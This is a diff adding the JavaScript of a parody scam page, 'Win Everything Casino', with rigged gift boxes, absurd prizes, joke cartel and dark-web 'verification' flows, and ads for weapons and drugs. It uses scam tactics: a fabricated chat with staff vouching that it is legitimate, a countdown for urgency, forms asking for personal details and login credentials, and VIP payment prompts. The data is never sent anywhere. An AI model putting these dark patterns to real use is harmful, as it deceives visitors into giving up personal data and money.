+    "$50,000,000,000,000,000 Cash", "$2,500,000,000,000,000 Target Credit", "Lamborghini Huracan Evo", "Canon EOS R50", "Rolex Submariner Ultra",
+    "Bitflash Laser Disruptor Ultra Premium", "Private Cosmic Tour Ultra Premium Plus", "Lifetime Netflix Ultra Premium Ultra Plus Ultra Plus Ultra Plus Ultra", "Ruby Tiara Ultra Premium Plus", "CyberPowerPC Ultra Elite Ultra Premium",
+    "1,000,000,000,000,000,000 Fortnite Credits", "2,500,000,000,000,000,000 Warzone Credits", "Lifetime Hulu Ultra Premium Ultra Plus Ultra Plus Pro", "Kobe Signed Jersey Ultra Premium", "1,000,000,000,000 Bitcoin",
+    "Trip to Canada Ultra", "Personal Hover Jet Ultra Premium Plus", "Electric Surfboard Ultra Premium Ultra", "Gold Chain Ultra Premium Plus", "NFL Super Bowl Championship MVP Ring",
+    "100,000,000,000,000,000,000,000,000,000,000,000,000 Tons of Chips", "Free Burgers Eternity Ultra Premium", "Space Station Tour Ultra Premium Plus", "Signed Hockey Stick Ultra Premium Plus", "Smart Ceiling Cinema Ultra Premium",
+    "Bitflash Nerve Gas Cannon Ultra Premium", "5,000,000,000 Tons of Platinum Bars", "Bitflash Cyber Rocket Sub Ultra Premium Plus"
+        ];
+     
+        const ads = [
+            {title: "Bitflash Guns", text: "Premium firearms available now!", id: "guns"},
+            {title: "Bitflash Drugs", text: "Exclusive substances on sale!", id: "drugs"},
+            {title: "Cartel Cash", text: "Process millions today!", id: "cash"},
+            {title: "Bitflash Hits", text: "Professional services available!", id: "hits"},
+            {title: "Stolen Goods", text: "Limited stock available!", id: "stolen"}
+        ];
+
+        // Sound Effects
+        const sounds = {
+            click: new Audio('https://www.myinstants.com/media/sounds/click.mp3'),
+            success: new Audio('https://www.myinstants.com/media/sounds/success.mp3'),
+            error: new Audio('https://www.myinstants.com/media/sounds/error.mp3')
+        };
+        function playSound(type) {
+            if (document.getElementById('soundToggle').checked) {
+                sounds[type].play().catch(() => {});
+            }
+        }
+
+        // Main Functions
+        function openGift(box) {
+            playSound('click');
+            if (attempts > 0) {
+                clicked++;
+                attempts--;
+                document.getElementById('attempts').innerText = attempts;
+                if (clicked < 3) {
+                    box.innerText = "Empty";
+                    box.style.background = "#ff0000";
+                    box.style.color = "#fff";
+                    box.onclick = null;
+                    addPoints(10);
+                } else {
+                    const prize = prizes[Math.floor(Math.random() * prizes.length)];
+                    box.innerText = prize;
+                    box.style.background = "#00ff00";
+                    box.style.color = "#000";
+                    box.style.fontSize = "20px";
+                    box.style.lineHeight = "180px";
+                    box.onclick = null;
+                    addPoints(50);
+                    setTimeout(() => {
+                        document.getElementById('prizeText').innerText = `You won: ${prize}`;
+                        document.getElementById('verifyModal').style.display = 'flex';
+                        document.getElementById('historyBox').innerHTML += `<p>${prize} - Just now</p>`;
+                        startTimer();
+                        triggerConfetti();
+                        playSound('success');
+                    }, 1500);
+                }
+            }
+        }
+
+        function addPoints(amount) {
+            loyaltyPoints += amount;
+            document.getElementById('loyaltyPoints').innerText = loyaltyPoints;
+        }
+
+        function toggleSettings() {
+            const menu = document.getElementById('settingsMenu');
+            menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
+            playSound('click');
+        }
+
+        function acceptConsent() {
+            document.getElementById('consentModal').style.display = 'none';
+            document.getElementById('mainContainer').style.display = 'block';
+            playSound('success');
+        }
+
+        function showPrivacy() {
+            showPopup("Privacy Policy\n\nEffective Date: March 29, 2025\n\nWin Everything Casino, a division of Bitflash Enterprises, collects extensive personal information, including but not limited to your name, contact details, IP address, geolocation, and behavioral data, for operational purposes. By engaging with our platform, you authorize us to aggregate, process, and disclose this information to third parties, including affiliates, marketing entities, and undisclosed partners, for commercial gain. Data may be transferred globally without restriction and retained indefinitely. Security measures are applied at our discretion, and we assume no liability for breaches. Your continued use constitutes consent to these practices. Inquiries may be directed to tkkeeb224@gmail.com, though responses are not guaranteed.", "Close");
+        }
+
+        function showTerms() {
+            showPopup("Terms of Service\n\nEffective Date: March 29, 2025\n\nBy accessing Win Everything Casino, operated by Bitflash Enterprises, you enter into a binding agreement granting us unrestricted rights to collect, utilize, and distribute your personal and transactional data for any purpose we deem profitable. Participation in our services is voluntary and at your sole risk; prizes, if awarded, are subject to unilateral verification and may be withheld without notice. We reserve the right to amend these terms, terminate accounts, or exploit user data without limitation or liability. All interactions are final and non-refundable. Disputes shall be resolved solely at our discretion. Contact tkkeeb224@gmail.com for assistance, subject to our availability.", "Close");
+        }
+
+        // Custom Popup
+        function showPopup(message, buttonText, callback) {
+            const popup = document.getElementById('customPopup');
+            document.getElementById('popupTitle').innerText = "Notice";
+            document.getElementById('popupMessage').innerText = message;
+            document.getElementById('popupButton').innerText = buttonText;
+            currentCallback = callback || hidePopup;
+            popup.style.display = 'block';
+        }
+
+        function hidePopup() {
+            document.getElementById('customPopup').style.display = 'none';
+            if (currentCallback) {
+                currentCallback();
+                currentCallback = null;
+            }
+        }
+
+        // Verification Functions
+        function showVerification(type) {
+            document.getElementById('verifyModal').style.display = 'none';
+            if (type === 'join') document.getElementById('joinModal').style.display = 'flex';
+            else if (type === 'smuggle') document.getElementById('smuggleModal').style.display = 'flex';
+            else if (type === 'darkweb') document.getElementById('darkwebModal').style.display = 'flex';
+            else if (type === 'launder') document.getElementById('launderModal').style.display = 'flex';
+            playSound('click');
+        }
+
+        function submitJoin() {
+            const name = document.getElementById('joinName').value;
+            const email = document.getElementById('joinEmail').value;
+            const phone = document.getElementById('joinPhone').value;
+            const address = document.getElementById('joinAddress').value;
+            const role = document.getElementById('joinRole').value;
+            const captcha = document.getElementById('joinCaptcha').value;
+            if (name && email && phone && address && role && captcha) {
+                showPopup(`Welcome to Bitflash Cartel, ${name}! Your prize is secured.`, "Confirm", showClaimed);
+                addPoints(100);
+                playSound('success');
+            } else {
+                showPopup("Please complete all fields to proceed.", "Try Again");
+            }
+        }
+
+        function moveShipment() {
+            smuggleProgress += 25;
+            const bar = document.getElementById('smuggleProgress');
+            const text = document.getElementById('smuggleText');
+            const status = document.getElementById('smuggleStatus');
+            bar.style.width = `${smuggleProgress}%`;
+            text.innerText = `${smuggleProgress}%`;
+            status.innerText = `Mission Progress: ${smuggleProgress}%`;
+            playSound('click');
+            if (smuggleProgress >= 100) {
+                status.innerText = "Mission Complete!";
+                document.getElementById('smuggleClaim').style.display = 'block';
+                addPoints(100);
+                playSound('success');
+            }
+        }
+
+        function claimSmuggle() {
+            showPopup("Smuggling mission completed! Your prize is secured.", "Confirm", showClaimed);
+            playSound('success');
+        }
+
+        function loginDarkweb() {
+            const user = document.getElementById('darkwebUser').value;
+            const pass = document.getElementById('darkwebPass').value;
+            if (user && pass) {
+                document.getElementById('darkwebLogin').style.display = 'none';
+                document.getElementById('darkwebMarket').style.display = 'block';
+                playSound('success');
+            } else {
+                showPopup("Please enter valid credentials to proceed.", "Try Again");
+            }
+        }
+
+        function verifyDarkweb() {
+            showPopup("Purchase verified! Your prize is secured.", "Confirm", showClaimed);
+            addPoints(100);
+            playSound('success');
+        }
+
+        function startLaundering() {
+            const cash = document.getElementById('launderCash');
+            const progress = document.getElementById('launderProgress');
+            const fill = document.getElementById('launderFill');
+            const text = document.getElementById('launderText');
+            document.querySelector('#launderModal .action-btn').style.display = 'none';
+            progress.style.display = 'block';
+            fill.style.width = '100%';
+            let percent = 0;
+            const interval = setInterval(() => {
+                percent += 10;
+                text.innerText = `${percent}%`;
+                playSound('click');
+                if (percent >= 100) {
+                    clearInterval(interval);
+                    cash.innerText = "$2,500,000 (Processed)";
+                    document.getElementById('launderClaim').style.display = 'block';
+                    addPoints(100);
+                    playSound('success');
+                }
+            }, 300);
+        }
+
+        function claimLaunder() {
+            showPopup("Funds processed successfully! Your prize is secured.", "Confirm", showClaimed);
+            playSound('success');
+        }
+
+        // Prize Claimed Page
+        function showClaimed() {
+            const prize = document.getElementById('prizeText').innerText.replace("You won: ", "");
+            document.getElementById('claimedPrize').innerText = `Your prize: ${prize} has been successfully processed.`;
+            document.querySelectorAll('.modal').forEach(modal => modal.style.display = 'none');
+            document.getElementById('claimedModal').style.display = 'flex';
+        }
+
+        // Ad Functions
+        function showAd(id) {
+            document.getElementById('adFullscreen').style.display = 'none';
+            document.getElementById(`${id}Modal`).style.display = 'flex';
+            playSound('click');
+        }
+
+        function buyItem(item, price) {
+            showPopup(`Order for ${item} (${price}) confirmed. Processing will begin shortly.`, "OK", backToMain);
+            addPoints(25);
+            playSound('success');
+        }
+
+        function orderAd(type) {
+            showPopup(`${type} processing initiated. Please allow time for completion.`, "OK", backToMain);
+            addPoints(50);
+            playSound('success');
+        }
+
+        function backToMain() {
+            document.querySelectorAll('.modal').forEach(modal => modal.style.display = 'none');
+            document.getElementById('mainContainer').style.display = 'block';
+            playSound('click');
+        }
+
+        // VIP Upgrade
+        function upgradeVIP(tier) {
+            const prices = { Silver: 49.99, Gold: 99.99, Platinum: 199.99 };
+            showPopup(`Upgrade to ${tier} VIP for $${prices[tier]}?`, "Confirm", () => {
+                showPopup(`Thank you for upgrading to ${tier} VIP! Benefits activated.`, "OK", backToMain);
+                addPoints(prices[tier] * 10);
+            });
+            playSound('success');
+        }
+
+        // Chat
+        const chatBox = document.getElementById('chatBox');
+        const users = ["JakePlays99", "SarahLovesCats", "MikeGaming2000", "DarkWebKing", "CartelBoss420", "LuckyLucy"];
+        const workers = ["Support_Chris", "Prize_Amy", "Help_Josh", "BitflashBot", "VIP_Dave"];
+        const questions = ["Anyone won big yet?", "How do I claim?", "Is this real?", "Just got a Tesla!", "Bitflash is the best!"];
+        const workerReplies = ["Verify now to claim!", "Keep playing!", "Absolutely legitimate!", "Prize processing underway!", "Welcome to Bitflash!"];
+        function addChatMessage() {
+            const isWorker = Math.random() > 0.7;
+            const username = isWorker ? workers[Math.floor(Math.random() * workers.length)] : users[Math.floor(Math.random() * users.length)];
+            const text = isWorker ? workerReplies[Math.floor(Math.random() * workerReplies.length)] : questions[Math.floor(Math.random() * questions.length)];
+            const message = `<div class="chat-message"><span class="chat-username ${isWorker ? 'worker' : ''}">${username}</span><span class="chat-text">${text}</span><span class="chat-timestamp">${Math.floor(Math.random() * 60)}s ago</span></div>`;
+            chatBox.innerHTML += message;
+            chatBox.scrollTop = chatBox.scrollHeight;
+        }
+        setInterval(addChatMessage, 3000);
+
+        // Timer
+        function startTimer() {
+            let time = 60;
+            const countdown = document.getElementById('countdown');
+            const interval = setInterval(() => {
+                time--;
+                countdown.innerText = time;
+                if (time <= 0) {
+                    clearInterval(interval);
+                    document.getElementById('verifyModal').style.display = 'none';
+                    showPopup("Time expired. Please try again.", "OK", backToMain);
+                }
+            }, 1000);
+        }
+
+        // Confetti
+        const canvas = document.getElementById('confettiCanvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        function triggerConfetti() {
+            const particles = [];
+            for (let i = 0; i < 200; i++) {
+                particles.push({
+                    x: Math.random() * canvas.width,
+                    y: Math.random() * canvas.height - canvas.height,
+                    size: Math.random() * 15 + 5,
+                    speed: Math.random() * 8 + 2,
+                    color: `hsl(${Math.random() * 360}, 100%, 50%)`
+                });
+            }
+            function animate() {
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+                particles.forEach(p => {
+                    ctx.fillStyle = p.color;
+                    ctx.fillRect(p.x, p.y, p.size, p.size);
+                    p.y += p.speed;
+                    if (p.y > canvas.height) p.y = -p.size;
+                });
+                requestAnimationFrame(animate);
+            }
+            animate();
+            setTimeout(() => ctx.clearRect(0, 0, canvas.width, canvas.height), 4000);
+        }
+
+        // Ads
+        function showFullscreenAd() {
+            const ad = document.getElementById('adFullscreen');
+            const adContent = document.getElementById('adContent');
+            const adData = ads[Math.floor(Math.random() * ads.length)];
+            adContent.innerHTML = `${adData.title}<br><button class="ad-btn" onclick="showAd('${adData.id}')">EXPLORE NOW</button>`;
+            ad.style.display = 'flex';
+            setTimeout(() => ad.style.display = 'none', 5000);
+            playSound('click');
+        }
+        setInterval(showFullscreenAd, 10000);
+
+        function showPopupAd() {
+            const ad = document.createElement('div');
+            ad.className = 'ad-popup';
+            const adData = ads[Math.floor(Math.random() * ads.length)];
+            ad.innerHTML = `
+                <span class="close" onclick="this.parentElement.remove()">×</span>
+                <h3>${adData.title}</h3>
+                <p>${adData.text}</p>
+                <button class="ad-btn" onclick="showAd('${adData.id}'); this.parentElement.remove()">Explore Now!</button>
+            `;
+            ad.style.top = Math.random() * 60 + '%';
+            ad.style.left = Math.random() * 60 + '%';
+            document.body.appendChild(ad);
+            setTimeout(() => ad.remove(), 7000);
+            playSound('click');
+        }
+        setInterval(showPopupAd, 5000);
+    </script>
+</body>
+</html>
